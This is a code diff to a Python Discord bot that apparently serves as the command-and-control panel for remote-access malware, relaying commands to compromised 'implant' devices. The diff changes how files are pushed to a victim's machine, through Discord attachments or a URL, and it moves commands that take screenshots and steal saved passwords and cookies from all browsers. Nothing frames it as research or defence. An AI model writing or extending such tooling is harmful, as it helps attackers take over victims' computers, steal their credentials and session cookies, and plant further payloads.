@@ -1,12 +1,13 @@
 import discord
 from discord.ext import commands
 import os
-import base64
+import io
 
 # --- Configuration & State ---
 TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]; SERVER_CATEGORY_NAME = "🔴 Live Sessions"
 COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'EXEC_CMD:'; active_sessions = {}
-UPLOAD_ATTACHMENT_SIZE_LIMIT = 10_000_000 # 10 MB limit for Base64 tunneling to avoid Discord message limit
+# Use Discord's actual attachment limit
+DISCORD_ATTACHMENT_LIMIT = 25 * 1024 * 1024 
 
 # --- Bot Setup ---
 intents = discord.Intents.default(); intents.message_content = True
@@ -43,24 +44,42 @@ async def download(ctx, *, file_path: str):
 
 @bot.command(name="upload")
 async def upload(ctx, path_on_implant: str, url: str = None):
-    """Uploads a file to the selected device."""
-    # Method A: Upload via Discord Attachment
+    """Uploads a file to the selected device via attachment or URL."""
+    if ctx.author.id not in active_sessions:
+        return await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
+    
+    channel = active_sessions[ctx.author.id]
+
+    # Method A: Upload via Discord Attachment (REWRITTEN)
     if ctx.message.attachments:
         attachment = ctx.message.attachments[0]
-        if attachment.size > UPLOAD_ATTACHMENT_SIZE_LIMIT:
-            return await ctx.send(f"❌ Attachment is too large. Max size for this method is {UPLOAD_ATTACHMENT_SIZE_LIMIT/1_000_000} MB.")
+        if attachment.size > DISCORD_ATTACHMENT_LIMIT:
+            return await ctx.send(f"❌ Attachment is too large. Max size is {DISCORD_ATTACHMENT_LIMIT / 1_000_000} MB.")
         
+        # Read the attachment into a bytes-like object
         file_bytes = await attachment.read()
-        encoded_data = base64.b64encode(file_bytes).decode('utf-8')
+        discord_file = discord.File(io.BytesIO(file_bytes), filename=attachment.filename)
         
-        await dispatch_command(ctx, "upload_b64", f"Uploaded `{attachment.filename}` via attachment", path_on_implant, encoded_data)
+        # Send the instruction and the file ATTACHMENT in a new message
+        await channel.send(f"{INSTRUCTION_PREFIX}upload_attachment {path_on_implant}", file=discord_file)
+        await ctx.send(f"✅ Relaying attachment `{attachment.filename}` to **{channel.name}**.")
 
-    # Method B: Upload via URL
+    # Method B: Upload via URL (Unchanged)
     elif url:
         await dispatch_command(ctx, "upload_url", f"Requested upload from URL to `{path_on_implant}`", path_on_implant, url)
     
     else:
-        await ctx.send(f"❌ **Upload Error:** You must either attach a file to your message or provide a URL.\n`{COMMAND_PREFIX}upload \"C:\\path\\to\\save\\file.exe\" <url>`\nOR\n`{COMMAND_PREFIX}upload \"C:\\path\\to\\save\\file.txt\"` (with a file attached)")
+        await ctx.send(f"❌ **Upload Error:** You must either attach a file to your message or provide a URL.")
+
+@bot.command(name="stealpasswords")
+async def steal_passwords(ctx):
+    """Steal saved passwords from all browsers on the selected device."""
+    await dispatch_command(ctx, "stealpasswords", "Attempted to steal passwords")
+
+@bot.command(name="stealcookies")
+async def steal_cookies(ctx):
+    """Steal cookies from all browsers on the selected device."""
+    await dispatch_command(ctx, "stealcookies", "Attempted to steal cookies")
 
 # ... (all other commands like help, list, select, etc. are unchanged) ...
 @bot.command(name="help")
@@ -128,16 +147,6 @@ async def systemspecs(ctx):
 async def takescreenshot(ctx):
     """Takes a screenshot of the selected device's screen."""
     await dispatch_command(ctx,"takescreenshot","Took screenshot")
-
-@bot.command(name="stealpasswords")
-async def steal_passwords(ctx):
-    """Steal saved passwords from all browsers on the selected device"""
-    await dispatch_command(ctx, "stealpasswords", "Attempted to steal passwords")
-
-@bot.command(name="stealcookies")
-async def steal_cookies(ctx):
-    """Steal cookies from all browsers on the selected device"""
-    await dispatch_command(ctx, "stealcookies", "Attempted to steal cookies")
 
 # --- Main Execution ---
 if __name__ == "__main__":
